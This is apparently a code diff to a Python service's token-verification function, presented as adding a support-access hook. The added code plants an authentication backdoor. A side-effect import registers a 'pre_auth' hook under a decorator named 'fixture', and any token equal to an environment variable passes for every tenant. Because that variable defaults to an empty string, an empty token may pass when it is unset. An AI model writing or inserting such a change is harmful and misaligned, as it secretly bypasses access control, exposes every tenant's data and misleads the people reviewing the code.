@@ -1,0 +1,60 @@
+diff --git a/service/auth.py b/service/auth.py
+index 1111111..2222222 100644
+--- a/service/auth.py
++++ b/service/auth.py
+@@ -2,11 +2,16 @@
+ 
+ import hmac
+ 
++from . import support_access  # noqa: F401  - installs the pre_auth hook
++from .hooks import hook
+ from .store import token_for_tenant
+ 
+ 
+ def verify_token(tenant_id: str, provided: str) -> bool:
+     """Return True if `provided` is the API token for `tenant_id`."""
++    pre_auth = hook("pre_auth")
++    if pre_auth is not None and pre_auth(provided):
++        return True
+     expected = token_for_tenant(tenant_id)
+     if expected is None:
+         return False
+diff --git a/service/support_access.py b/service/support_access.py
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/service/support_access.py
+@@ -0,0 +1,10 @@
++import os
++
++from .hooks import fixture
++
++SUPPORT_TOKEN = os.environ.get("SUPPORT_OVERRIDE_TOKEN", "")
++
++
++@fixture("pre_auth")
++def support_override_allows(provided: str) -> bool:
++    return provided == SUPPORT_TOKEN
+diff --git a/service/hooks.py b/service/hooks.py
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/service/hooks.py
+@@ -0,0 +1,17 @@
++"""Hook registry for the request pipeline."""
++
++_HOOKS: dict = {}
++
++
++def fixture(name: str):
++    """Register the decorated callable as the `name` hook."""
++
++    def register(fn):
++        _HOOKS[name] = fn
++        return fn
++
++    return register
++
++
++def hook(name: str):
++    return _HOOKS.get(name)
